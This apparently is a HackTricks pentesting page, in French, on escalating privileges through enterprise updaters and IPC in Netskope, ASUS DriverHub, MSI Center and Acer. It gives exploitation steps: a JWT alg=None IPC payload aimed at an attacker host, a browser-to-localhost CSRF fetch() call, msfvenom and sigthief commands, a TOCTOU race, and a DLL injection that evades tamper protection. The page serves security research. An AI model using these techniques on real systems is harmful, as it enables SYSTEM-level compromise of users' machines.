# Abuser les auto-updaters d'entreprise et l'IPC privilégié (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes d'escalade de privilèges locaux Windows trouvées dans les agents d'endpoint et updaters d'entreprise qui exposent une surface IPC low\-friction et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur à faibles privilèges peut contraindre l'enrôlement vers un serveur contrôlé par l'attaquant puis livrer un MSI malveillant que le service SYSTEM installe.

Idées clés réutilisables contre des produits similaires :
- Abuser de l'IPC localhost d'un service privilégié pour forcer le réenrôlement ou la reconfiguration vers un serveur contrôlé par l'attaquant.
- Implémenter les endpoints de mise à jour du fournisseur, livrer une Trusted Root CA malveillante, et pointer l'updater vers un package malveillant « signé ».
- Éviter les vérifications de signer faibles (CN allow\-lists), les flags de digest optionnels, et les propriétés MSI laxistes.
- Si l'IPC est « encrypted », dériver la key/IV à partir d'identifiants machine lisibles par tous stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injecter dans un processus allow\-listé ou en lancer un en suspended et bootstrapper votre DLL via un patch minimal du thread\-context.

---
## 1) Forcer l'enrôlement vers un serveur contrôlé par l'attaquant via IPC localhost

De nombreux agents embarquent un processus UI en user\-mode qui parle à un service SYSTEM via localhost TCP en JSON.

Observé dans Netskope :
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flux d'exploitation :
1) Créer un token JWT d'enrôlement dont les claims contrôlent l'hôte backend (ex. AddonUrl). Utiliser alg=None pour qu'aucune signature ne soit requise.
2) Envoyer le message IPC invoquant la commande de provisioning avec votre JWT et le tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre serveur malveillant pour enrollment/config, p. ex.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Remarques :
- Si la vérification de l'appelant se fait en fonction du chemin/nom (path/name\-based), lancez la requête depuis un binaire fournisseur allow\-listed (voir §4).

---
## 2) Détournement du canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et redirigez-le vers un MSI malveillant. Séquence typique :

1) /v2/config/org/clientconfig → Retourner une config JSON avec un intervalle de mise à jour très court, p. ex.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA PEM. Le service l’installe dans le Local Machine Trusted Root store.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une fausse version.

Bypass des vérifications courantes observées en pratique :
- Signer CN allow\-list : le service peut seulement vérifier que le Subject CN est égal à “netSkope Inc” ou “Netskope, Inc.”. Votre CA rogue peut émettre un certificat leaf avec ce CN et signer le MSI.
- CERT_DIGEST property : inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune application forcée à l’installation.
- Optional digest enforcement : un flag de config (p.ex., check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Depuis R127, Netskope encapsulait le JSON IPC dans un champ encryptData qui ressemble à du Base64. Le reverse a montré un AES avec clé/IV dérivés de valeurs de registre lisibles par n’importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Un attaquant peut reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard. Astuce générale : si un agent “chiffre” soudainement son IPC, cherchez des device IDs, product GUIDs, install IDs sous HKLM comme matériel.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Certains services tentent d’authentifier le pair en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l’image avec des binaires allow\-listés du vendor situés sous Program Files (p.ex., stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- Injection de DLL dans un process allow\-listé (p.ex., nsdiag.exe) et proxy de l’IPC depuis l’intérieur.
- Lancer un binaire allow\-listé en suspended et bootstrapper votre DLL proxy sans CreateRemoteThread (voir §5) pour satisfaire les règles de tamper imposées par le driver.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Les produits incluent souvent un driver de minifilter/OB callbacks (p.ex., Stadrv) pour retirer des droits dangereux des handles vers les processus protégés :
- Process : supprime PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : restreint à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user\-mode fiable qui respecte ces contraintes :
1) CreateProcess d’un binaire vendor avec CREATE_SUSPENDED.
2) Obtenir les handles encore permis : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le process, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou juste THREAD_RESUME si vous modifiez du code à un RIP connu).
3) Écraser ntdll!NtContinue (ou un autre thunk tôt et garanti mappé) par un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis saute en arrière.
4) ResumeThread pour déclencher votre stub in\-process, chargeant votre DLL.

Parce que vous n’avez jamais utilisé PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sur un process déjà protégé (vous l’avez créé), la politique du driver est satisfaite.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatise une rogue CA, la signature d’un MSI malveillant, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope est un client IPC custom qui forge des messages IPC arbitraires (optionnellement AES\-chiffrés) et inclut l’injection par process suspended pour initier depuis un binaire allow\-listé.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub livre un service HTTP user\-mode (ADU.exe) sur 127.0.0.1:53000 qui attend des appels browser venant de https://driverhub.asus.com. Le filtre d’origine effectue simplement `string_contains(".asus.com")` sur l’en-tête Origin et sur les URLs de téléchargement exposées par `/asus/v1.0/*`. Tout hôte contrôlé par un attaquant tel que `https://driverhub.asus.com.attacker.tld` passe donc la vérification et peut émettre des requêtes modifiant l’état depuis JavaScript. Voir [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) pour des patterns de contournement supplémentaires.

Flux pratique :
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Même le PowerShell CLI montré ci‑dessous réussit lorsque l'en-tête Origin est spoofed à la valeur de confiance :
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Toute visite du navigateur vers le site de l’attaquant devient donc un CSRF local en 1\-click (ou 0\-click via `onload`) qui pilote un helper SYSTEM.

---
## 2) Vérification de code-signing non sécurisée & clonage de certificat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne, donc `http://updates.asus.com.attacker.tld:8000/payload.exe` est acceptée. Après le téléchargement, ADU.exe se contente de vérifier que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter – pas de `WinVerifyTrust`, pas de validation de chaîne.

Pour weaponizer le flux :
1) Créez un payload (par ex., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonez le signer d’ASUS dedans (par ex., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hébergez `pwn.exe` sur un domaine imitant `.asus.com` et déclenchez UpdateApp via le CSRF navigateur ci‑dessus.

Parce que les filtres Origin et URL sont basés sur des sous‑chaînes et que la vérification du signer compare uniquement des chaînes, DriverHub récupère et exécute le binaire de l’attaquant dans son contexte élevé.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque trame est `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) embarque `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l’exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le subject du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer la Trame A pointant vers un binaire légitime signé MSI (garantit que la vérification de signature passe et que la tâche est mise en file).
- Le rusher avec des messages Trame B répétés pointant vers un payload malveillant, écrasant `MSI Center SDK.exe` juste après la fin de la vérification.

Quand le scheduler se déclenche, il exécute le payload écrasé sous SYSTEM malgré la validation du fichier original. L’exploitation fiable utilise deux goroutines/threads qui spamment CMD_AutoUpdateSDK jusqu’à gagner la fenêtre TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une trame sélectionnent ce composant, permettant aux attaquants d’acheminer des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans **aucune validation de signature** – tout utilisateur local peut le pointer vers `C:\Users\<user>\Desktop\payload.exe` et obtenir une exécution SYSTEM de manière déterministe.
- Sniffer le loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement le mapping Component ↔ command ; des clients Go/Python personnalisés peuvent alors rejouer les trames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et son ACL discrétionnaire permet des clients distants (p.ex., `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` avec un chemin de fichier invoque la routine de spawning du service.
- La bibliothèque cliente sérialise un octet terminateur magique (113) avec les args. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif mappe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) bascule dans la branche générique qui conserve le token SYSTEM complet et définit un SID d’intégrité élevé (`S-1-16-12288`). Le binaire lancé s’exécute donc en SYSTEM sans restriction, aussi bien localement que cross-machine.
- Combinez cela avec le flag d’installateur exposé (`Setup.exe -nocheck`) pour déployer ACC même sur des VM de labo et tester le pipe sans matériel du vendor.

Ces bugs IPC illustrent pourquoi les services localhost doivent appliquer une authentification mutuelle (ALPC SIDs, filtres `ImpersonationLevel=Impersonation`, token filtering) et pourquoi l’aide « run arbitrary binary » de chaque module doit partager les mêmes vérifications de signer.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
